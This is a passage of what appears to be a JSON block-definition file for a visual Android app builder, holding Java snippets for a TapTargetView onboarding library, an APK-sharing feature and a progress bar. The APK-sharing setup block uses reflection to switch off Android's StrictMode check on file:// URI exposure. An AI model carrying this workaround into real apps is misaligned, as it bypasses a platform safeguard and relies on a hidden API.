isInteractable \u003d false;\n                    listener.onTargetClick(TapTargetView.this);\n                } else if (clickedInsideOfOuterCircle) {\n                    listener.onOuterCircleClick(TapTargetView.this);\n                } else if (cancelable) {\n                    isInteractable \u003d false;\n                    listener.onTargetCancel(TapTargetView.this);\n                }\n            }\n        });\n\n        setOnLongClickListener(new OnLongClickListener() {\n            @Override\n            public boolean onLongClick(View v) {\n                if (listener \u003d\u003d null) return false;\n\n                if (targetBounds.contains((int) lastTouchX, (int) lastTouchY)) {\n                    listener.onTargetLongClick(TapTargetView.this);\n                    return true;\n                }\n\n                return false;\n            }\n        });\n    }\n\n    private void startExpandAnimation() {\n        if (!visible) {\n            isInteractable \u003d false;\n            expandAnimation.start();\n            visible \u003d true;\n        }\n    }\n\n    protected void applyTargetOptions(Context context) {\n        shouldTintTarget \u003d target.tintTarget;\n        shouldDrawShadow \u003d target.drawShadow;\n        cancelable \u003d target.cancelable;\n\n        // We can\u0027t clip out portions of a view outline, so if the user specified a transparent\n        // target, we need to fallback to drawing a jittered shadow approximation\n        if (shouldDrawShadow \u0026\u0026 Build.VERSION.SDK_INT \u003e\u003d 21 \u0026\u0026 !target.transparentTarget) {\n            outlineProvider \u003d new ViewOutlineProvider() {\n                @Override\n                public void getOutline(View view, Outline outline) {\n                    if (outerCircleCenter \u003d\u003d null) return;\n                    outline.setOval(\n                            (int) (outerCircleCenter[0] - outerCircleRadius), (int) (outerCircleCenter[1] - outerCircleRadius),\n                            (int) (outerCircleCenter[0] + outerCircleRadius), (int) (outerCircleCenter[1] + outerCircleRadius));\n                    outline.setAlpha(outerCircleAlpha / 255.0f);\n                    if (Build.VERSION.SDK_INT \u003e\u003d 22) {\n                        outline.offset(0, SHADOW_DIM);\n                    }\n                }\n            };\n\n            setOutlineProvider(outlineProvider);\n            setElevation(SHADOW_DIM);\n        }\n\n        if (shouldDrawShadow \u0026\u0026 outlineProvider \u003d\u003d null \u0026\u0026 Build.VERSION.SDK_INT \u003c 18) {\n            setLayerType(LAYER_TYPE_SOFTWARE, null);\n        } else {\n            setLayerType(LAYER_TYPE_HARDWARE, null);\n        }\n\n        final android.content.res.Resources.Theme theme \u003d context.getTheme();\n        isDark \u003d UiUtil.themeIntAttr(context, \"isLightTheme\") \u003d\u003d 0;\n\n        final Integer outerCircleColor \u003d target.outerCircleColorInt(context);\n        if (outerCircleColor !\u003d null) {\n            outerCirclePaint.setColor(outerCircleColor);\n        } else if (theme !\u003d null) {\n            outerCirclePaint.setColor(UiUtil.themeIntAttr(context, \"colorPrimary\"));\n        } else {\n            outerCirclePaint.setColor(Color.WHITE);\n        }\n\n        final Integer targetCircleColor \u003d target.targetCircleColorInt(context);\n        if (targetCircleColor !\u003d null) {\n            targetCirclePaint.setColor(targetCircleColor);\n        } else {\n            targetCirclePaint.setColor(isDark ? Color.BLACK : Color.WHITE);\n        }\n\n        if (target.transparentTarget) {\n            targetCirclePaint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.CLEAR));\n        }\n\n        targetCirclePulsePaint.setColor(targetCirclePaint.getColor());\n\n        final Integer targetDimColor \u003d target.dimColorInt(context);\n        if (targetDimColor !\u003d null) {\n            dimColor \u003d UiUtil.setAlpha(targetDimColor, 0.3f);\n        } else {\n            dimColor \u003d -1;\n        }\n\n        final Integer titleTextColor \u003d target.titleTextColorInt(context);\n        if (titleTextColor !\u003d null) {\n            titlePaint.setColor(titleTextColor);\n        } else {\n            titlePaint.setColor(isDark ? Color.BLACK : Color.WHITE);\n        }\n\n        final Integer descriptionTextColor \u003d target.descriptionTextColorInt(context);\n        if (descriptionTextColor !\u003d null) {\n            descriptionPaint.setColor(descriptionTextColor);\n        } else {\n            descriptionPaint.setColor(titlePaint.getColor());\n        }\n\n        if (target.titleTypeface !\u003d null) {\n            titlePaint.setTypeface(target.titleTypeface);\n        }\n\n        if (target.descriptionTypeface !\u003d null) {\n            descriptionPaint.setTypeface(target.descriptionTypeface);\n        }\n    }\n\n    @Override\n    protected void onDetachedFromWindow() {\n        super.onDetachedFromWindow();\n        onDismiss(false);\n    }\n\n    void onDismiss(boolean userInitiated) {\n        if (isDismissed) return;\n\n        isDismissing \u003d false;\n        isDismissed \u003d true;\n\n        for (final ValueAnimator animator : animators) {\n            animator.cancel();\n            animator.removeAllUpdateListeners();\n        }\n        ViewUtil.removeOnGlobalLayoutListener(getViewTreeObserver(), globalLayoutListener);\n        visible \u003d false;\n\n        if (listener !\u003d null) {\n            listener.onTargetDismissed(this, userInitiated);\n        }\n    }\n\n    @Override\n    protected void onDraw(Canvas c) {\n        if (isDismissed || outerCircleCenter \u003d\u003d null) return;\n\n        if (topBoundary \u003e 0 \u0026\u0026 bottomBoundary \u003e 0) {\n            c.clipRect(0, topBoundary, getWidth(), bottomBoundary);\n        }\n\n        if (dimColor !\u003d -1) {\n            c.drawColor(dimColor);\n        }\n\n        int saveCount;\n        outerCirclePaint.setAlpha(outerCircleAlpha);\n        if (shouldDrawShadow \u0026\u0026 outlineProvider \u003d\u003d null) {\n            saveCount \u003d c.save();\n            {\n                c.clipPath(outerCirclePath, Region.Op.DIFFERENCE);\n                drawJitteredShadow(c);\n            }\n            c.restoreToCount(saveCount);\n        }\n        c.drawCircle(outerCircleCenter[0], outerCircleCenter[1], outerCircleRadius, outerCirclePaint);\n\n        targetCirclePaint.setAlpha(targetCircleAlpha);\n        if (targetCirclePulseAlpha \u003e 0) {\n            targetCirclePulsePaint.setAlpha(targetCirclePulseAlpha);\n            c.drawCircle(targetBounds.centerX(), targetBounds.centerY(),\n                    targetCirclePulseRadius, targetCirclePulsePaint);\n        }\n        c.drawCircle(targetBounds.centerX(), targetBounds.centerY(),\n                targetCircleRadius, targetCirclePaint);\n\n        saveCount \u003d c.save();\n        {\n            c.translate(textBounds.left, textBounds.top);\n            titlePaint.setAlpha(textAlpha);\n            if (titleLayout !\u003d null) {\n                titleLayout.draw(c);\n            }\n\n            if (descriptionLayout !\u003d null \u0026\u0026 titleLayout !\u003d null) {\n                c.translate(0, titleLayout.getHeight() + TEXT_SPACING);\n                descriptionPaint.setAlpha((int) (target.descriptionTextAlpha * textAlpha));\n                descriptionLayout.draw(c);\n            }\n        }\n        c.restoreToCount(saveCount);\n\n        saveCount \u003d c.save();\n        {\n            if (tintedTarget !\u003d null) {\n                c.translate(targetBounds.centerX() - tintedTarget.getWidth() / 2,\n                        targetBounds.centerY() - tintedTarget.getHeight() / 2);\n                c.drawBitmap(tintedTarget, 0, 0, targetCirclePaint);\n            } else if (target.icon !\u003d null) {\n                c.translate(targetBounds.centerX() - target.icon.getBounds().width() / 2,\n                        targetBounds.centerY() - target.icon.getBounds().height() / 2);\n                target.icon.setAlpha(targetCirclePaint.getAlpha());\n                target.icon.draw(c);\n            }\n        }\n        c.restoreToCount(saveCount);\n\n        if (debug) {\n            drawDebugInformation(c);\n        }\n    }\n\n    @Override\n    public boolean onTouchEvent(MotionEvent e) {\n        lastTouchX \u003d e.getX();\n        lastTouchY \u003d e.getY();\n        return super.onTouchEvent(e);\n    }\n\n    @Override\n    public boolean onKeyDown(int keyCode, KeyEvent event) {\n        if (isVisible() \u0026\u0026 cancelable \u0026\u0026 keyCode \u003d\u003d KeyEvent.KEYCODE_BACK) {\n            event.startTracking();\n            return true;\n        }\n\n        return false;\n    }\n\n    @Override\n    public boolean onKeyUp(int keyCode, KeyEvent event) {\n        if (isVisible() \u0026\u0026 isInteractable \u0026\u0026 cancelable\n                \u0026\u0026 keyCode \u003d\u003d KeyEvent.KEYCODE_BACK \u0026\u0026 event.isTracking() \u0026\u0026 !event.isCanceled()) {\n            isInteractable \u003d false;\n\n            if (listener !\u003d null) {\n                listener.onTargetCancel(this);\n            } else {\n                new Listener().onTargetCancel(this);\n            }\n\n            return true;\n        }\n\n        return false;\n    }\n\n    /**\n     * Dismiss this view\n     * @param tappedTarget If the user tapped the target or not\n     *                     (results in different dismiss animations)\n     */\n    public void dismiss(boolean tappedTarget) {\n        isDismissing \u003d true;\n        pulseAnimation.cancel();\n        expandAnimation.cancel();\n        if (tappedTarget) {\n            dismissConfirmAnimation.start();\n        } else {\n            dismissAnimation.start();\n        }\n    }\n\n    /** Specify whether to draw a wireframe around the view, useful for debugging **/\n    public void setDrawDebug(boolean status) {\n        if (debug !\u003d status) {\n            debug \u003d status;\n            postInvalidate();\n        }\n    }\n\n    /** Returns whether this view is visible or not **/\n    public boolean isVisible() {\n        return !isDismissed \u0026\u0026 visible;\n    }\n\n    void drawJitteredShadow(Canvas c) {\n        final float baseAlpha \u003d 0.20f * outerCircleAlpha;\n        outerCircleShadowPaint.setStyle(Paint.Style.FILL_AND_STROKE);\n        outerCircleShadowPaint.setAlpha((int) baseAlpha);\n        c.drawCircle(outerCircleCenter[0], outerCircleCenter[1] + SHADOW_DIM, outerCircleRadius, outerCircleShadowPaint);\n        outerCircleShadowPaint.setStyle(Paint.Style.STROKE);\n        final int numJitters \u003d 7;\n        for (int i \u003d numJitters - 1; i \u003e 0; --i) {\n            outerCircleShadowPaint.setAlpha((int) ((i / (float) numJitters) * baseAlpha));\n            c.drawCircle(outerCircleCenter[0], outerCircleCenter[1] + SHADOW_DIM ,\n                    outerCircleRadius + (numJitters - i) * SHADOW_JITTER_DIM , outerCircleShadowPaint);\n        }\n    }\n\n    void drawDebugInformation(Canvas c) {\n        if (debugPaint \u003d\u003d null) {\n            debugPaint \u003d new Paint();\n            debugPaint.setARGB(255, 255, 0, 0);\n            debugPaint.setStyle(Paint.Style.STROKE);\n            debugPaint.setStrokeWidth(UiUtil.dp(getContext(), 1));\n        }\n\n        if (debugTextPaint \u003d\u003d null) {\n            debugTextPaint \u003d new TextPaint();\n            debugTextPaint.setColor(0xFFFF0000);\n            debugTextPaint.setTextSize(UiUtil.sp(getContext(), 16));\n        }\n\n        // Draw wireframe\n        debugPaint.setStyle(Paint.Style.STROKE);\n        c.drawRect(textBounds, debugPaint);\n        c.drawRect(targetBounds, debugPaint);\n        c.drawCircle(outerCircleCenter[0], outerCircleCenter[1], 10, debugPaint);\n        c.drawCircle(outerCircleCenter[0], outerCircleCenter[1], calculatedOuterCircleRadius - CIRCLE_PADDING, debugPaint);\n        c.drawCircle(targetBounds.centerX(), targetBounds.centerY(), TARGET_RADIUS + TARGET_PADDING, debugPaint);\n\n        // Draw positions and dimensions\n        debugPaint.setStyle(Paint.Style.FILL);\n        final String debugText \u003d\n                \"Text bounds: \" + textBounds.toShortString() + \"n\" +\n                        \"Target bounds: \" + targetBounds.toShortString() + \"n\" +\n                        \"Center: \" + outerCircleCenter[0] + \" \" + outerCircleCenter[1] + \"n\" +\n                        \"View size: \" + getWidth() + \" \" + getHeight() + \"n\" +\n                        \"Target bounds: \" + targetBounds.toShortString();\n\n        if (debugStringBuilder \u003d\u003d null) {\n            debugStringBuilder \u003d new SpannableStringBuilder(debugText);\n        } else {\n            debugStringBuilder.clear();\n            debugStringBuilder.append(debugText);\n        }\n\n        if (debugLayout \u003d\u003d null) {\n            debugLayout \u003d new DynamicLayout(debugText, debugTextPaint, getWidth(), Layout.Alignment.ALIGN_NORMAL, 1.0f, 0.0f, false);\n        }\n\n        final int saveCount \u003d c.save();\n        {\n            debugPaint.setARGB(220, 0, 0, 0);\n            c.translate(0.0f, topBoundary);\n            c.drawRect(0.0f, 0.0f, debugLayout.getWidth(), debugLayout.getHeight(), debugPaint);\n            debugPaint.setARGB(255, 255, 0, 0);\n            debugLayout.draw(c);\n        }\n        c.restoreToCount(saveCount);\n    }\n\n    void drawTintedTarget() {\n        final android.graphics.drawable.Drawable icon \u003d target.icon;\n        if (!shouldTintTarget || icon \u003d\u003d null) {\n            tintedTarget \u003d null;\n            return;\n        }\n\n        if (tintedTarget !\u003d null) return;\n\n        tintedTarget \u003d Bitmap.createBitmap(icon.getIntrinsicWidth(), icon.getIntrinsicHeight(),\n                Bitmap.Config.ARGB_8888);\n        final Canvas canvas \u003d new Canvas(tintedTarget);\n        icon.setColorFilter(new PorterDuffColorFilter(\n                outerCirclePaint.getColor(), PorterDuff.Mode.SRC_ATOP));\n        icon.draw(canvas);\n        icon.setColorFilter(null);\n    }\n\n    void updateTextLayouts() {\n        final int textWidth \u003d Math.min(getWidth(), TEXT_MAX_WIDTH) - TEXT_PADDING * 2;\n        if (textWidth \u003c\u003d 0) {\n            return;\n        }\n\n        titleLayout \u003d new StaticLayout(title, titlePaint, textWidth,\n                Layout.Alignment.ALIGN_NORMAL, 1.0f, 0.0f, false);\n\n        if (description !\u003d null) {\n            descriptionLayout \u003d new StaticLayout(description, descriptionPaint, textWidth,\n                    Layout.Alignment.ALIGN_NORMAL, 1.0f, 0.0f, false);\n        } else {\n            descriptionLayout \u003d null;\n        }\n    }\n\n    float halfwayLerp(float lerp) {\n        if (lerp \u003c 0.5f) {\n            return lerp / 0.5f;\n        }\n\n        return (1.0f - lerp) / 0.5f;\n    }\n\n    float delayedLerp(float lerp, float threshold) {\n        if (lerp \u003c threshold) {\n            return 0.0f;\n        }\n\n        return (lerp - threshold) / (1.0f - threshold);\n    }\n\n    void calculateDimensions() {\n        textBounds \u003d getTextBounds();\n        outerCircleCenter \u003d getOuterCircleCenterPoint();\n        calculatedOuterCircleRadius \u003d getOuterCircleRadius(outerCircleCenter[0], outerCircleCenter[1], textBounds, targetBounds);\n    }\n\n    void calculateDrawingBounds() {\n        if (outerCircleCenter \u003d\u003d null) {\n            // Called dismiss before we got a chance to display the tap target\n            // So we have no center -\u003e cant determine the drawing bounds\n            return;\n        }\n        drawingBounds.left \u003d (int) Math.max(0, outerCircleCenter[0] - outerCircleRadius);\n        drawingBounds.top \u003d (int) Math.min(0, outerCircleCenter[1] - outerCircleRadius);\n        drawingBounds.right \u003d (int) Math.min(getWidth(),\n                outerCircleCenter[0] + outerCircleRadius + CIRCLE_PADDING);\n        drawingBounds.bottom \u003d (int) Math.min(getHeight(),\n                outerCircleCenter[1] + outerCircleRadius + CIRCLE_PADDING);\n    }\n\n    int getOuterCircleRadius(int centerX, int centerY, Rect textBounds, Rect targetBounds) {\n        final int targetCenterX \u003d targetBounds.centerX();\n        final int targetCenterY \u003d targetBounds.centerY();\n        final int expandedRadius \u003d (int) (1.1f * TARGET_RADIUS);\n        final Rect expandedBounds \u003d new Rect(targetCenterX, targetCenterY, targetCenterX, targetCenterY);\n        expandedBounds.inset(-expandedRadius, -expandedRadius);\n\n        final int textRadius \u003d maxDistanceToPoints(centerX, centerY, textBounds);\n        final int targetRadius \u003d maxDistanceToPoints(centerX, centerY, expandedBounds);\n        return Math.max(textRadius, targetRadius) + CIRCLE_PADDING;\n    }\n\n    Rect getTextBounds() {\n        final int totalTextHeight \u003d getTotalTextHeight();\n        final int totalTextWidth \u003d getTotalTextWidth();\n\n        final int possibleTop \u003d targetBounds.centerY() - TARGET_RADIUS - TARGET_PADDING - totalTextHeight;\n        final int top;\n        if (possibleTop \u003e topBoundary) {\n            top \u003d possibleTop;\n        } else {\n            top \u003d targetBounds.centerY() + TARGET_RADIUS + TARGET_PADDING;\n        }\n\n        final int relativeCenterDistance \u003d (getWidth() / 2) - targetBounds.centerX();\n        final int bias \u003d relativeCenterDistance \u003c 0 ? -TEXT_POSITIONING_BIAS : TEXT_POSITIONING_BIAS;\n        final int left \u003d Math.max(TEXT_PADDING, targetBounds.centerX() - bias - totalTextWidth);\n        final int right \u003d Math.min(getWidth() - TEXT_PADDING, left + totalTextWidth);\n        return new Rect(left, top, right, top + totalTextHeight);\n    }\n\n    int[] getOuterCircleCenterPoint() {\n        if (inGutter(targetBounds.centerY())) {\n            return new int[]{targetBounds.centerX(), targetBounds.centerY()};\n        }\n\n        final int targetRadius \u003d Math.max(targetBounds.width(), targetBounds.height()) / 2 + TARGET_PADDING;\n        final int totalTextHeight \u003d getTotalTextHeight();\n\n        final boolean onTop \u003d targetBounds.centerY() - TARGET_RADIUS - TARGET_PADDING - totalTextHeight \u003e 0;\n\n        final int left \u003d Math.min(textBounds.left, targetBounds.left - targetRadius);\n        final int right \u003d Math.max(textBounds.right, targetBounds.right + targetRadius);\n        final int titleHeight \u003d titleLayout \u003d\u003d null ? 0 : titleLayout.getHeight();\n        final int centerY \u003d onTop ?\n                targetBounds.centerY() - TARGET_RADIUS - TARGET_PADDING - totalTextHeight + titleHeight\n                :\n                targetBounds.centerY() + TARGET_RADIUS + TARGET_PADDING + titleHeight;\n\n        return new int[] { (left + right) / 2, centerY };\n    }\n\n    int getTotalTextHeight() {\n        if (titleLayout \u003d\u003d null) {\n            return 0;\n        }\n\n        if (descriptionLayout \u003d\u003d null) {\n            return titleLayout.getHeight() + TEXT_SPACING;\n        }\n\n        return titleLayout.getHeight() + descriptionLayout.getHeight() + TEXT_SPACING;\n    }\n\n    int getTotalTextWidth() {\n        if (titleLayout \u003d\u003d null) {\n            return 0;\n        }\n\n        if (descriptionLayout \u003d\u003d null) {\n            return titleLayout.getWidth();\n        }\n\n        return Math.max(titleLayout.getWidth(), descriptionLayout.getWidth());\n    }\n    boolean inGutter(int y) {\n        if (bottomBoundary \u003e 0) {\n            return y \u003c GUTTER_DIM || y \u003e bottomBoundary - GUTTER_DIM;\n        } else {\n            return y \u003c GUTTER_DIM || y \u003e getHeight() - GUTTER_DIM;\n        }\n    }\n    int maxDistanceToPoints(int x1, int y1, Rect bounds) {\n        final double tl \u003d distance(x1, y1, bounds.left, bounds.top);\n        final double tr \u003d distance(x1, y1, bounds.right, bounds.top);\n        final double bl \u003d distance(x1, y1, bounds.left, bounds.bottom);\n        final double br \u003d distance(x1, y1, bounds.right, bounds.bottom);\n        return (int) Math.max(tl, Math.max(tr, Math.max(bl, br)));\n    }\n    double distance(int x1, int y1, int x2, int y2) {\n        return Math.sqrt(Math.pow(x2 - x1, 2) + Math.pow(y2 - y1, 2));\n    }\n    void invalidateViewAndOutline(Rect bounds) {\n        invalidate(bounds);\n        if (outlineProvider !\u003d null \u0026\u0026 Build.VERSION.SDK_INT \u003e\u003d 21) {\n            invalidateOutline();\n        }\n    }\n}\n\t\tstatic class ViewUtil {\n\n    ViewUtil() {}\n\n    private static boolean isLaidOut(View view) {\n        return true;\n    }\n    static void onLaidOut(final View view, final Runnable runnable) {\n        if (isLaidOut(view)) {\n            runnable.run();\n            return;\n        }\n        final ViewTreeObserver observer \u003d view.getViewTreeObserver();\n        observer.addOnGlobalLayoutListener(new ViewTreeObserver.OnGlobalLayoutListener() {\n            @Override\n            public void onGlobalLayout() {\n                final ViewTreeObserver trueObserver;\n                if (observer.isAlive()) {\n                    trueObserver \u003d observer;\n                } else {\n                    trueObserver \u003d view.getViewTreeObserver();\n                }\n                removeOnGlobalLayoutListener(trueObserver, this);\n                runnable.run();\n            }\n        });\n    }\n    @SuppressWarnings(\"deprecation\")\n    static void removeOnGlobalLayoutListener(ViewTreeObserver observer,\n                                             ViewTreeObserver.OnGlobalLayoutListener listener) {\n        if (Build.VERSION.SDK_INT \u003e\u003d 16) {\n            observer.removeOnGlobalLayoutListener(listener);\n        } else {\n            observer.removeGlobalOnLayoutListener(listener);\n        }\n    }\n    static void removeView(ViewManager parent, View child) {\n        if (parent \u003d\u003d null || child \u003d\u003d null) {\n            return;\n        }\n        try {\n            parent.removeView(child);\n        } catch (Exception ignored) {\n        }\n    }\n}\n\t\tstatic class ViewTapTarget extends TapTarget {\n    final View view;\n\n    ViewTapTarget(View view, CharSequence title,  CharSequence description) {\n        super(title, description);\n        if (view \u003d\u003d null) {\n            throw new IllegalArgumentException(\"Given null view to target\");\n        }\n        this.view \u003d view;\n    }\n\n    @Override\n    public void onReady(final Runnable runnable) {\n        ViewUtil.onLaidOut(view, new Runnable() {\n            @Override\n            public void run() {\n                // Cache bounds\n                final int[] location \u003d new int[2];\n                view.getLocationOnScreen(location);\n                bounds \u003d new Rect(location[0], location[1],\n                        location[0] + view.getWidth(), location[1] + view.getHeight());\n\n                if (icon \u003d\u003d null \u0026\u0026 view.getWidth() \u003e 0 \u0026\u0026 view.getHeight() \u003e 0) {\n                    final Bitmap viewBitmap \u003d Bitmap.createBitmap(view.getWidth(), view.getHeight(), Bitmap.Config.ARGB_8888);\n                    final Canvas canvas \u003d new Canvas(viewBitmap);\n                    view.draw(canvas);\n                    icon \u003d new android.graphics.drawable.BitmapDrawable(view.getContext().getResources(), viewBitmap);\n                    icon.setBounds(0, 0, icon.getIntrinsicWidth(), icon.getIntrinsicHeight());\n                }\n\n                runnable.run();\n            }\n        });\n    }\n}\n\t\tstatic class TapTargetSequence {\n    private final Activity activity;\n    private final Dialog dialog;\n    private final Queue\u003cTapTarget\u003e targets;\n    private boolean active;\n    private TapTargetView currentView;\n    Listener listener;\n    boolean considerOuterCircleCanceled;\n    boolean continueOnCancel;\n    public interface Listener {\n        void onSequenceFinish();\n        void onSequenceStep(TapTarget lastTarget, boolean targetClicked);\n        void onSequenceCanceled(TapTarget lastTarget);\n    }\n    public TapTargetSequence(Activity activity) {\n        if (activity \u003d\u003d null) throw new IllegalArgumentException(\"Activity is null\");\n        this.activity \u003d activity;\n        this.dialog \u003d null;\n        this.targets \u003d new LinkedList\u003c\u003e();\n    }\n    public TapTargetSequence(Dialog dialog) {\n        if (dialog \u003d\u003d null) throw new IllegalArgumentException(\"Given null Dialog\");\n        this.dialog \u003d dialog;\n        this.activity \u003d null;\n        this.targets \u003d new LinkedList\u003c\u003e();\n    }\n    public TapTargetSequence targets(List\u003cTapTarget\u003e targets) {\n        this.targets.addAll(targets);\n        return this;\n    }\n    public TapTargetSequence targets(TapTarget... targets) {\n        Collections.addAll(this.targets, targets);\n        return this;\n    }\n    public TapTargetSequence target(TapTarget target) {\n        this.targets.add(target);\n        return this;\n    }\n    public TapTargetSequence continueOnCancel(boolean status) {\n        this.continueOnCancel \u003d status;\n        return this;\n    }\n    public TapTargetSequence considerOuterCircleCanceled(boolean status) {\n        this.considerOuterCircleCanceled \u003d status;\n        return this;\n    }\n    public TapTargetSequence listener(Listener listener) {\n        this.listener \u003d listener;\n        return this;\n    }\n    public void start() {\n        if (targets.isEmpty() || active) {\n            return;\n        }\n        active \u003d true;\n        showNext();\n    }\n    public void startWith(int targetId) {\n        if (active) {\n            return;\n        }\n        while (targets.peek() !\u003d null \u0026\u0026 targets.peek().id() !\u003d targetId) {\n            targets.poll();\n        }\n        TapTarget peekedTarget \u003d targets.peek();\n        if (peekedTarget \u003d\u003d null || peekedTarget.id() !\u003d targetId) {\n            throw new IllegalStateException(\"Given target \" + targetId + \" not in sequence\");\n        }\n        start();\n    }\n    public void startAt(int index) {\n        if (active) {\n            return;\n        }\n        if (index \u003c 0 || index \u003e\u003d targets.size()) {\n            throw new IllegalArgumentException(\"Given invalid index \" + index);\n        }\n        final int expectedSize \u003d targets.size() - index;\n        while (targets.peek() !\u003d null \u0026\u0026 targets.size() !\u003d expectedSize) {\n            targets.poll();\n        }\n        if (targets.size() !\u003d expectedSize) {\n            throw new IllegalStateException(\"Given index \" + index + \" not in sequence\");\n        }\n        start();\n    }\n    public boolean cancel() {\n        if (targets.isEmpty() || !active) {\n            return false;\n        }\n        if (currentView \u003d\u003d null || !currentView.cancelable) {\n            return false;\n        }\n        currentView.dismiss(false);\n        active \u003d false;\n        targets.clear();\n        if (listener !\u003d null) {\n            listener.onSequenceCanceled(currentView.target);\n        }\n        return true;\n    }\n    void showNext() {\n        try {\n            TapTarget tapTarget \u003d targets.remove();\n            if (activity !\u003d null) {\n                currentView \u003d TapTargetView.showFor(activity, tapTarget, tapTargetListener);\n            } else {\n                currentView \u003d TapTargetView.showFor(dialog, tapTarget, tapTargetListener);\n            }\n        } catch (NoSuchElementException e) {\n            // No more targets\n            if (listener !\u003d null) {\n                listener.onSequenceFinish();\n            }\n        }\n    }\n    private final TapTargetView.Listener tapTargetListener \u003d new TapTargetView.Listener() {\n        @Override\n        public void onTargetClick(TapTargetView view) {\n            super.onTargetClick(view);\n            if (listener !\u003d null) {\n                listener.onSequenceStep(view.target, true);\n            }\n            showNext();\n        }\n        @Override\n        public void onOuterCircleClick(TapTargetView view) {\n            if (considerOuterCircleCanceled) {\n                onTargetCancel(view);\n            }\n        }\n        @Override\n        public void onTargetCancel(TapTargetView view) {\n            super.onTargetCancel(view);\n            if (continueOnCancel) {\n                if (listener !\u003d null) {\n                    listener.onSequenceStep(view.target, false);\n                }\n                showNext();\n            } else {\n                if (listener !\u003d null) {\n                    listener.onSequenceCanceled(view.target);\n                }\n            }\n        }\n    };","name":"TapTargetLibraryMoreblock","palette":"92","type":" ","spec":"##TapTargetLibrary (add to Mblock)##"},{"code":"TapTargetView.showFor(%1$s.this,\n\n\n\nTapTarget.forView(%2$s, %3$s, %4$s)\n\n                            .outerCircleColorInt(Color.parseColor(%5$s))\n\n                            .outerCircleAlpha(0.99f)\n\n                            .targetCircleColor(android.R.color.white)\n\n                            .titleTextSize(24)\n\n                            .titleTextColor(android.R.color.white)\n\n                            .descriptionTextSize(18)\n\n                            .descriptionTextColor(android.R.color.white)\n\n                            .textColor(android.R.color.white)\n\n                            .textTypeface(Typeface.SANS_SERIF)\n\n                            .dimColor(android.R.color.black)\n\n                            .drawShadow(true)\n\n                            .cancelable(false)\n\n                            .tintTarget(true)\n\n                            .transparentTarget(true)\n\n                            .targetRadius(60),\n\n                new TapTargetView.Listener() {\n\n                    @Override\n\n                    public void onTargetClick(TapTargetView view) {\n\n                        super.onTargetClick(view);\n\n               \n\n  \n\n  }\n\n                });","name":"TapTarget","palette":"92","type":" ","spec":"TapTarget on %m.activity view %m.view title %s content %s color %s"},{"code":"\t\t\tStrictMode.VmPolicy.Builder builder \u003d \n\t\t\t\tnew StrictMode.VmPolicy.Builder(); \n\t\t\t\tStrictMode.setVmPolicy(builder.build());\n\t\t\t\tif(Build.VERSION.SDK_INT\u003e\u003d24){ \n\t\t\t\t\t    try{\n\t\t\t\t\t\t\t\tjava.lang.reflect.Method m \u003d \n\t\t\t\t\t\t        StrictMode.class.getMethod(\n\t\t\t\t\t\t\t\t\"disableDeathOnFileUriExposure\"); \n\t\t\t\t\t\t        m.invoke(null); \n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcatch(Exception e){ \n\t\t\t\t\t\t\t\tshowMessage(e.toString()); \n\t\t\t\t\t\t\t} \n\t\t\t\t}","name":"ShareApkLibOnCreate","palette":"92","type":" ","spec":"##ShareApkLib(add to OnCreate)##"},{"code":"\t\t%1$s.setOnClickListener(new View.OnClickListener(){\n\t\t\t@Override\n\t\t\tpublic void onClick(View _view){\n\t\t\t\tshareApplication();\n\t\t\t}\n\t\t});","name":"ShareApplicationOnViewClick","palette":"92","type":" ","spec":"Share application on %m.view clicked"},{"code":"}\nprivate void shareApplication() { \n\t\t\t\t\t\tandroid.content.pm.ApplicationInfo app \u003d \n\t\t\t\t\t\tgetApplicationContext().getApplicationInfo(); \n\t\t\t\t\t\tString filePath \u003d app.sourceDir;\n\t\t\t\t\t\tIntent intent \u003d new Intent(Intent.ACTION_SEND); \n\t\t\t\t\t\tintent.setType(\"*/*\"); \n\t\t\t\t\t\tjava.io.File originalApk \u003d new java.io.File(filePath); \n\t\t\t\t\t\ttry {  \n\t\t\t\t\t\t\t\tjava.io.File tempFile \u003d new java.io.File(getExternalCacheDir() + \"/ExtractedApk\"); \n\t\t\t\t\t\t \t\tif (!tempFile.isDirectory()) \n\t\t\t\t\t\t\t\t\tif (!tempFile.mkdirs()) \n\t\t\t\t\t\t\t\t\treturn; \n\t\t\t\t\t\t\t\t\ttempFile \u003d new java.io.File(tempFile.getPath() + \"/\" + \n\t\t\t\t\t\t\t\t\t%1$s);\n\t\t\t\t\t\t\t\t\tif (!tempFile.exists()) \n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\ttry{\n\t\t\t\t\t\t\t\t\t\t\t\t\tif (!tempFile.createNewFile()) { \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\treturn; }\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcatch (java.io.IOException e){} \n\t\t\t\t\t\t\t\t\t\t} \n\t\t\t\t\t\t\t\t\tjava.io.InputStream in \u003d new java.io.FileInputStream (originalApk);\n\t\t\t\t\t\t\t\t\tjava.io.OutputStream out \u003d new java.io.FileOutputStream(tempFile);\n\t\t\t\t\t\t\t\t\tbyte[] buf \u003d new byte[1024];\n\t\t\t\t\t\t\t\t\tint len; \n\t\t\t\t\t\t\t\t\twhile ((len \u003d in.read(buf)) \u003e 0) { \n\t\t\t\t\t\t\t\t\t\t\t\tout.write(buf, 0, len); \n\t\t\t\t\t\t\t\t\t} \n\t\t\t\t\t\t\t\t\tin.close(); \n\t\t\t\t\t\t\t\t\tout.close(); \n\t\t\t\t\t\t\t\t\tintent.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(tempFile));\n\t\t\t\t\t\t\t\t\tstartActivity(Intent.createChooser(intent, %2$s));\n\t\t\t\t\t\t} \n\t\t\t\t\t\tcatch (java.io.IOException e) \n\t\t\t\t\t\t{ showMessage(e.toString()); \n\t\t\t\t\t\t} \n\t\t\t}\n{","name":"ShareApkLibMoreblock","palette":"92","type":" ","spec":"##Share apk with name (example : myApp.apk) %s and shareInfo %s (add to Mblock)##"},{"code":"}\npublic static class GoogleProgressBar extends ProgressBar {\n\tpublic static int _type \u003d 0;\n\tpublic static int[] _color \u003d new int[]{0xFFC93437, 0xFF375BF1, 0xFFF7D23E, 0xFF34A350}; //Red, blue, yellow, green\n    private enum ProgressType {\n        FOLDING_CIRCLES,\n        GOOGLE_MUSIC_DICES,\n        NEXUS_ROTATION_CROSS,\n        CHROME_FLOATING_CIRCLES\n    }\n    public GoogleProgressBar(Context context) {\n        this(context, null);\n    }\n    public GoogleProgressBar(Context context, AttributeSet attrs) 